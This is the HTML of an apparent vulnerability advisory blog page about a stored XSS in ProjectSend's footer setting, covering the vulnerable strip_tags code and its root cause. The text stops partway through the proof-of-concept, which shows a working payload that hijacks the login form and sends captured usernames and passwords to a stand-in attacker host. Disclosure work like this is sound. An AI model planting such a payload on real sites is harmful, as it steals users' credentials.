@@ -1,0 +1,1007 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A detailed breakdown of a stored XSS in ProjectSend's Footer Content setting, exploring its vulnerability mechanics, exploitation workflow, and core mitigation.">
+      
+      
+        <meta name="author" content="x6b">
+      
+      
+        <link rel="canonical" href="https://x6b.me/vulns/Stored-XSS-in-ProjectSend-Footer-Content/">
+      
+      
+        <link rel="prev" href="../RCE-on-MCPJam-%3C=-v1.4.2/">
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="zensical-0.0.43">
+    
+    
+      
+        <title>Stored-XSS-in-ProjectSend-Footer-Content - x6b's things</title>
+      
+    
+    
+      
+        
+      
+      <link rel="stylesheet" href="../../assets/stylesheets/modern/main.fba56155.min.css">
+      
+        
+          
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/modern/palette.dfe2e883.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=JetBrains+Mono:300,300i,400,400i,500,500i,700,700i%7CJetBrains+Mono:400,400i,700,700i&amp;display=fallback">
+        <style>:root{--md-text-font:"JetBrains Mono";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_scope.pathname.endsWith("/")||(__md_scope=new URL(__md_scope.pathname+"/",location)),__md_hash=e=>[...e].reduce(((e,t)=>(e<<5)-e+t.charCodeAt(0)),0),__md_get=(e,t=localStorage,_=__md_scope)=>JSON.parse(t.getItem(_.pathname+"."+e)),__md_set=(e,t,_=localStorage,a=__md_scope)=>{try{_.setItem(a.pathname+"."+e,JSON.stringify(t))}catch(e){}},document.documentElement.setAttribute("data-platform",navigator.platform)</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-4GQ16PP5Q4"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-4GQ16PP5Q4",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-4GQ16PP5Q4",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="cyan" data-md-color-accent="light-blue">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer" aria-label="Navigation"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#stored-xss-in-footer-content-setting-leads-to-site-wide-credential-harvesting-via-login-form-hijacking" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="x6b&#x27;s things" class="md-header__button md-logo" aria-label="x6b's things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer" aria-label="Navigation">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-menu" viewBox="0 0 24 24"><path d="M4 5h16M4 12h16M4 19h16"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            x6b's things
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Stored-XSS-in-ProjectSend-Footer-Content
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="default" data-md-color-primary="cyan" data-md-color-accent="light-blue"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-sun" viewBox="0 0 24 24"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="none" data-md-color-scheme="slate" data-md-color-primary="cyan" data-md-color-accent="light-blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-moon" viewBox="0 0 24 24"><path d="M20.985 12.486a9 9 0 1 1-9.473-9.472c.405-.022.617.46.402.803a6 6 0 0 0 8.268 8.268c.344-.215.825-.004.803.401"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search" aria-label="Search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-search" viewBox="0 0 24 24"><path d="m21 21-4.34-4.34"/><circle cx="11" cy="11" r="8"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog" aria-label="Search">
+  <button type="button" class="md-search__button">
+    Search
+  </button>
+</div>
+      
+    
+    <div class="md-header__source">
+      
+    </div>
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="x6b&#x27;s things" class="md-nav__button md-logo" aria-label="x6b's things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-book-open" viewBox="0 0 24 24"><path d="M12 7v14M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z"/></svg>
+
+    </a>
+    x6b's things
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-user" viewBox="0 0 24 24"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+  whoami
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+  Vulns
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+  Vulns
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../RCE-on-MCPJam-%3C=-v1.4.2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+  RCE-on-MCPJam-<=-CVE-2026-23744
+
+    
+  </span>
+  
+  
+    
+  
+  
+    <span class="md-status md-status--new"></span>
+  
+
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+  Stored-XSS-in-ProjectSend-Footer-Content
+
+    
+  </span>
+  
+  
+    
+  
+  
+    <span class="md-status md-status--new"></span>
+  
+
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="././" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+  Stored-XSS-in-ProjectSend-Footer-Content
+
+    
+  </span>
+  
+  
+    
+  
+  
+    <span class="md-status md-status--new"></span>
+  
+
+  
+
+      </a>
+      
+        
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Summary
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#affected-component" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Affected Component
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Affected Component">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerable-code" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Vulnerable Code
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#root-cause" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Root Cause
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-required-to-inject" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Privilege Required to Inject
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#proof-of-concept" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Proof-of-Concept
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Proof-of-Concept">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attack-vector-breakdown" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Attack Vector Breakdown
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#steps-to-reproduce" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Steps to Reproduce
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#impact" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Impact
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remediation-recommendations" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Remediation Recommendations
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#disclosure-timeline" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Disclosure Timeline
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  
+                    
+                    
+                    
+                      
+                    
+                    
+                      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+                      <div class="md-sidebar-button__wrapper">
+                        <label class="md-sidebar-button" for="__toc"></label>
+                      </div>
+                    
+                  
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Summary
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#affected-component" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Affected Component
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Affected Component">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vulnerable-code" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Vulnerable Code
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#root-cause" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Root Cause
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-required-to-inject" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Privilege Required to Inject
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#proof-of-concept" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Proof-of-Concept
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Proof-of-Concept">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attack-vector-breakdown" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Attack Vector Breakdown
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#steps-to-reproduce" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Steps to Reproduce
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#impact" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Impact
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remediation-recommendations" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Remediation Recommendations
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#disclosure-timeline" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Disclosure Timeline
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+<h1 id="stored-xss-in-footer-content-setting-leads-to-site-wide-credential-harvesting-via-login-form-hijacking">Stored XSS in "Footer Content" Setting Leads to Site-Wide Credential Harvesting via Login Form Hijacking<a class="headerlink" href="#stored-xss-in-footer-content-setting-leads-to-site-wide-credential-harvesting-via-login-form-hijacking" title="Permanent link">&para;</a></h1>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">Metric</th>
+<th style="text-align: left;">Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><strong>Severity Rating</strong></td>
+<td style="text-align: left;">High</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>CVSS v4 score</strong></td>
+<td style="text-align: left;">8.3</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>CVSS v4 vector</strong></td>
+<td style="text-align: left;">CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:A/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Component Affected</strong></td>
+<td style="text-align: left;">ProjectSend (legacy branch)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Affected Versions</strong></td>
+<td style="text-align: left;">&lt;= r2029 (latest legacy release as of 2026-07-10)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Patched Version</strong></td>
+<td style="text-align: left;">r2098</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Vulnerability Class</strong></td>
+<td style="text-align: left;">CWE-79 (Stored XSS), specifically CWE-83 (Improper Neutralization of Script in Attributes in a Web Page)</td>
+</tr>
+<tr>
+<td style="text-align: left;"><strong>Reporter</strong></td>
+<td style="text-align: left;">Venkata Karthik Kakarla</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition note">
+<p class="admonition-title">Basic primitive, non-basic exploitation</p>
+<p>CWE-79 is the umbrella weakness, but it's broad enough to cover reflected, DOM-based, and stored XSS alike. The specific mechanism here sits under <strong>CWE-83</strong> — the sanitizer only filters tag <em>names</em> via an allowlist and never inspects the <em>attributes</em> on the tags it permits, so an event-handler attribute like <code>onmouseover</code> rides through untouched on an otherwise-allowed <code>&lt;span&gt;</code>. That precision matters here: what isn't textbook is the exploitation chain built on top of it. Rather than a proof-of-concept <code>alert(1)</code>, the payload performs live <strong>formjacking</strong> against the login form, arming a credential-exfiltration listener on hover and shipping captured <code>username</code>/<code>password</code> values out-of-band before the application ever validates them, deliberately routing around the <code>HttpOnly</code> cookie flag rather than attempting to defeat it. That's the same technique class used in real-world Magecart-style payment-skimming attacks, applied here to an authentication form instead of a checkout form.</p>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Affected versions</p>
+<p>ProjectSend recently underwent a major revision: the classic codebase (up to r2029/r2098) has been marked <strong>Legacy</strong>, and development has moved to a rewritten, Laravel-based codebase released as <strong>v2.0.0</strong> and <strong>v2.1.0</strong>. This advisory targets the legacy branch only — effectively all legacy releases <strong>&lt;= r2029</strong> are affected. The fix was subsequently backported to the legacy branch in <strong>r2098</strong>; the new Laravel-based v2.x line was not assessed as part of this research.</p>
+</div>
+<h2 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">&para;</a></h2>
+<p>The "Footer Content" field under <strong>Options → General Options → Site Information</strong> accepts arbitrary HTML with no output sanitization or encoding. Because the footer is rendered on every page of the application, including the <strong>unauthenticated login page</strong>, an attacker who holds a privilege capable of editing this setting (by default, the <strong>System Administrator</strong> role, or any custom role granted the <code>Edit Settings</code> permission) can persist a malicious payload that executes in the browser of every subsequent visitor, including users who have not yet authenticated.</p>
+<p>The submitted proof-of-concept weaponizes this to perform <strong>Credential Harvesting</strong>: hovering over the injected footer element attaches an event listener to the login form's submit button that intercepts the <code>username</code> and <code>password</code> field values and exfiltrates them via an out-of-band HTTP request to an attacker-controlled domain at the moment the victim submits their login credentials, before the credentials are ever validated by the application.</p>
+<p>Because the application's session cookie is issued with the <code>HttpOnly</code> flag, direct session-cookie theft via <code>document.cookie</code> is not possible through this vector; the credential-harvesting technique demonstrated here was chosen specifically because it does not depend on cookie access and fully bypasses that mitigation.</p>
+<h2 id="affected-component">Affected Component<a class="headerlink" href="#affected-component" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>Injection point:</strong> Options → General Options → Site Information → Footer Content</li>
+<li><strong>Rendered at:</strong> Global application footer (<code>&lt;div id="footer"&gt;</code>), present on every page, including the login page which extends <code>footer.php</code></li>
+<li><strong>Rendering function:</strong> <code>render_footer_text()</code></li>
+</ul>
+<h3 id="vulnerable-code">Vulnerable Code<a class="headerlink" href="#vulnerable-code" title="Permanent link">&para;</a></h3>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">function render_footer_text()</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="x">{</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="x">    ?&gt;</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="x">    &lt;footer&gt;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="x">        &lt;div id=&quot;footer&quot;&gt;</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="x">            </span><span class="cp">&lt;?php</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>            <span class="k">if</span> <span class="p">(</span><span class="nx">is_projectsend_installed</span><span class="p">()</span> <span class="o">&amp;&amp;</span> <span class="nx">get_option</span><span class="p">(</span><span class="s1">&#39;footer_custom_enable&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>                <span class="k">echo</span> <span class="nb">strip_tags</span><span class="p">(</span><span class="nx">get_option</span><span class="p">(</span><span class="s1">&#39;footer_custom_content&#39;</span><span class="p">),</span> <span class="s1">&#39;&lt;br&gt;&lt;span&gt;&lt;a&gt;&lt;strong&gt;&lt;em&gt;&lt;b&gt;&lt;i&gt;&lt;u&gt;&lt;s&gt;&#39;</span><span class="p">);</span>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>                <span class="o">...</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>            <span class="p">}</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>            <span class="cp">?&gt;</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="x">        &lt;/div&gt;</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="x">    &lt;/footer&gt;</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="cp">&lt;?php</span>
+</span></code></pre></div>
+<h3 id="root-cause">Root Cause<a class="headerlink" href="#root-cause" title="Permanent link">&para;</a></h3>
+<p>The stored footer content is filtered using PHP's <code>strip_tags()</code> with a tag-name allowlist (<code>&lt;br&gt;&lt;span&gt;&lt;a&gt;&lt;strong&gt;&lt;em&gt;&lt;b&gt;&lt;i&gt;&lt;u&gt;&lt;s&gt;</code>). <code>strip_tags()</code> only removes disallowed <strong>tag names</strong> — it does not inspect, filter, or strip <strong>attributes</strong> on tags that are allowed through. Since <code>&lt;span&gt;</code> and <code>&lt;a&gt;</code> are permitted, an attacker can freely attach any attribute to them, including executable event-handler attributes such as <code>onmouseover</code>, <code>onclick</code>, <code>onfocus</code>, etc., and these are echoed into the page verbatim with no further HTML-entity encoding.</p>
+<p>This is a well-documented class of allowlist bypass: tag-name stripping is not equivalent to HTML sanitization, and is explicitly called out as an anti-pattern in the <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding-for-html-contexts">OWASP XSS Prevention Cheat Sheet</a>, which notes that simple tag stripping fails specifically because it doesn't address event-handler attributes on permitted tags, and recommends a real HTML sanitization library instead.</p>
+<h2 id="privilege-required-to-inject">Privilege Required to Inject<a class="headerlink" href="#privilege-required-to-inject" title="Permanent link">&para;</a></h2>
+<p>By default, only the <strong>System Administrator</strong> role can access Options → General Options. However, ProjectSend supports granular, custom role creation, and any custom role granted the <code>Edit Settings</code> permission without being granted full System Administrator rights can also reach and modify this field. This creates two distinct risk pathways, detailed under <strong>Impact</strong> below.</p>
+<h2 id="proof-of-concept">Proof-of-Concept<a class="headerlink" href="#proof-of-concept" title="Permanent link">&para;</a></h2>
+<p><strong>Payload saved into Footer Content:</strong></p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">&lt;</span><span class="nt">span</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#&quot;</span> <span class="na">tabindex</span><span class="o">=</span><span class="s">&quot;0&quot;</span> <span class="na">onmouseover</span><span class="o">=</span><span class="s">&quot;console.log(&#39;Payload injected, submit button now exfils credentials&#39;); document.getElementById(&#39;login_form&#39;).addEventListener(&#39;submit&#39;, function(e){ var u = document.getElementById(&#39;username&#39;).value; var p = document.getElementById(&#39;password&#39;).value; fetch(&#39;http://threatactor.domain&#39; + &#39;/log?u=&#39; + u + &#39;&amp;p=&#39; + p); }, true); &quot;</span><span class="p">&gt;</span>Hover to inject payload to submit button - Credential harvest<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<p><strong>Resulting rendered HTML on every page (including the login page):</strong></p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;footer&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>    <span class="p">&lt;</span><span class="nt">span</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;#&quot;</span> <span class="na">tabindex</span><span class="o">=</span><span class="s">&quot;0&quot;</span> <span class="na">onmouseover</span><span class="o">=</span><span class="s">&quot;console.log(&#39;Payload injected, submit button now exfils credentials&#39;); document.getElementById(&#39;login_form&#39;).addEventListener(&#39;submit&#39;, function(e){ var u = document.getElementById(&#39;username&#39;).value; var p = document.getElementById(&#39;password&#39;).value; fetch(&#39;http://threatactor.domain&#39; + &#39;/log?u=&#39; + u + &#39;&amp;amp;p=&#39; + p); }, true);&quot;</span><span class="p">&gt;</span>Hover to inject payload to submit button - Credential harvest
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>        <span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
